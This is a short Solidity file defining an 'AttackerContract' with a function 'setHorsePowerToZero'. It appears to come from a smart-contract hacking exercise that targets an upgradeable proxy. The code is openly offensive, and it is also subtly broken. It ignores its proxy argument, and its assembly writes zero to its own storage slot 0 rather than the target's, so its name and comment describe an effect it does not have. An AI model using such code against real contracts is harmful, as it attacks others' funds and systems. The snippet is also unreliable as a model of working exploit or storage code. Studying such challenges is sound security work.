pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract AttackerContract {
    // Vulnerability: No check on upgrader modification
    function setHorsePowerToZero(address proxy) external {
        uint256 zero = 0;
        bytes32 slot = 0;
        assembly {
            sstore(slot, zero)
        }
    }
}